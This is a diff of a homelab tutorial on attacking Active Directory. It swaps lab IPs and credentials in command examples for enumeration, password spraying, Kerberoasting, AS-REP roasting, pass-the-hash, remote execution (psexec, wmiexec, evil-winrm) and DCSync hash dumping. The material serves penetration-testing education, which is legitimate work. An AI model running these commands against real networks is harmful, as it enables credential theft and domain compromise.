@@ -1,4 +1,4 @@
-# 06 — Active Directory Attacks: Overview and Methodology
+# 03 — Active Directory Attacks: Overview and Methodology
 
 ## The Attacker's Mindset in AD
 
@@ -47,7 +47,7 @@ bloodhound &
 .\SharpHound.exe -c All
 
 # Or collect remotely with BloodHound.py (from Kali)
-python3 bloodhound.py -u alice -p Password1 \
+python3 bloodhound.py -u alice.rossi -p Password123! \
   -d homelab.local -dc dc.homelab.local -c All
 
 # Import the generated .zip into BloodHound GUI
@@ -62,18 +62,18 @@ python3 bloodhound.py -u alice -p Password1 \
 
 ```bash
 # Enumerate all users
-ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
-  -D "alice@homelab.local" -w Password1 \
+ldapsearch -H ldap://10.10.10.10 -x -b "DC=homelab,DC=local" \
+  -D "alice.rossi@homelab.local" -w Password123! \
   "(objectClass=user)" sAMAccountName description
 
 # Enumerate Domain Admins
-ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
-  -D "alice@homelab.local" -w Password1 \
+ldapsearch -H ldap://10.10.10.10 -x -b "DC=homelab,DC=local" \
+  -D "alice.rossi@homelab.local" -w Password123! \
   "(memberOf=CN=Domain Admins,CN=Users,DC=homelab,DC=local)"
 
 # Find service accounts with SPNs (Kerberoastable)
-ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
-  -D "alice@homelab.local" -w Password1 \
+ldapsearch -H ldap://10.10.10.10 -x -b "DC=homelab,DC=local" \
+  -D "alice.rossi@homelab.local" -w Password123! \
   "(&(objectClass=user)(servicePrincipalName=*))" \
   sAMAccountName servicePrincipalName
 ```
@@ -82,16 +82,16 @@ ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
 
 ```bash
 # Enumerate SMB hosts
-crackmapexec smb 10.20.20.0/24
+crackmapexec smb 10.10.10.0/24
 
 # Enumerate shares
-crackmapexec smb 10.20.20.10 -u alice -p Password1 --shares
+crackmapexec smb 10.10.10.10 -u alice.rossi -p Password123! --shares
 
 # Enumerate users
-crackmapexec smb 10.20.20.10 -u alice -p Password1 --users
+crackmapexec smb 10.10.10.10 -u alice.rossi -p Password123! --users
 
 # Password spraying (test one password against all users)
-crackmapexec smb 10.20.20.10 -u users.txt -p Password1 \
+crackmapexec smb 10.10.10.10 -u users.txt -p Password123! \
   --continue-on-success
 ```
 
@@ -140,7 +140,7 @@ Try one password against many users. Avoids lockout.
 
 ```bash
 # Test "Password1" against all users (slow = avoid lockout)
-crackmapexec smb 10.20.20.10 -u users.txt -p Password1 \
+crackmapexec smb 10.10.10.10 -u users.txt -p Password123! \
   --continue-on-success
 
 # Common weak passwords to try
@@ -153,8 +153,8 @@ the initial "Welcome1" or seasonal passwords.
 ### Kerberoasting (revisited)
 ```bash
 # Get all Kerberoastable hashes
-python3 GetUserSPNs.py homelab.local/alice:Password1 \
-  -dc-ip 10.20.20.10 -request -outputfile kerberoast.txt
+python3 GetUserSPNs.py homelab.local/alice.rossi:Password123! \
+  -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt
 
 # Crack hashes
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
@@ -164,12 +164,12 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
 ### AS-REP Roasting (revisited)
 ```bash
 # Without valid credentials (if guest access enabled)
-python3 GetNPUsers.py homelab.local/ -dc-ip 10.20.20.10 \
+python3 GetNPUsers.py homelab.local/ -dc-ip 10.10.10.10 \
   -usersfile users.txt -no-pass
 
 # With valid credentials
-python3 GetNPUsers.py homelab.local/alice:Password1 \
-  -dc-ip 10.20.20.10 -request
+python3 GetNPUsers.py homelab.local/alice.rossi:Password123! \
+  -dc-ip 10.10.10.10 -request
 
 # Crack
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
@@ -186,15 +186,15 @@ Use NTLM hash without cracking it.
 
 ```bash
 # SMB lateral movement with hash
-crackmapexec smb 10.20.20.11 -u Administrator \
+crackmapexec smb 10.10.10.50 -u Administrator \
   -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE'
 
 # Execute commands
-crackmapexec smb 10.20.20.11 -u Administrator \
+crackmapexec smb 10.10.10.50 -u Administrator \
   -H 'HASH' -x whoami
 
 # Get shell via PsExec with hash
-python3 psexec.py -hashes 'LM:NTLM' administrator@10.20.20.11
+python3 psexec.py -hashes 'LM:NTLM' administrator@10.10.10.50
 ```
 
 **Why it works:** NTLM authentication accepts the hash directly.
@@ -203,24 +203,24 @@ No need to crack it — just replay it.
 ### WMI Execution
 ```bash
 # Execute command via WMI
-python3 wmiexec.py administrator:Password1@10.20.20.11 whoami
+python3 wmiexec.py administrator:Adm1n!str4tor@10.10.10.50 whoami
 
 # Or with hash
-python3 wmiexec.py -hashes :NTLM_HASH administrator@10.20.20.11
+python3 wmiexec.py -hashes :NTLM_HASH administrator@10.10.10.50
 ```
 
 ### SMBExec
 ```bash
-python3 smbexec.py administrator:Password1@10.20.20.11
+python3 smbexec.py administrator:Adm1n!str4tor@10.10.10.50
 ```
 
 ### WinRM (Port 5985)
 ```bash
 # PowerShell remoting
-evil-winrm -i 10.20.20.11 -u administrator -p Password1
+evil-winrm -i 10.10.10.50 -u administrator -p Adm1n!str4tor23!
 
 # Or with hash
-evil-winrm -i 10.20.20.11 -u administrator -H NTLM_HASH
+evil-winrm -i 10.10.10.50 -u administrator -H NTLM_HASH
 ```
 
 ---
@@ -269,7 +269,7 @@ Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs |
 ### DCSync — Extract All Hashes Remotely
 ```bash
 # Requires Replication rights (Domain Admin or delegated)
-python3 secretsdump.py homelab.local/Administrator:Password1@10.20.20.10
+python3 secretsdump.py homelab.local/Administrator:Adm1n!str4tor@10.10.10.10
 
 # Output includes:
 # Administrator:500:LM_HASH:NTLM_HASH:::
@@ -368,7 +368,7 @@ Given our lab setup (Windows Server 2025 DC + Windows 11 client):
 
 ```
 Step 1: Network discovery
-  nmap -sV 10.20.20.0/24
+  nmap -sV 10.10.10.0/24
 
 Step 2: Enumerate AD
   bloodhound-python / ldapsearch / crackmapexec
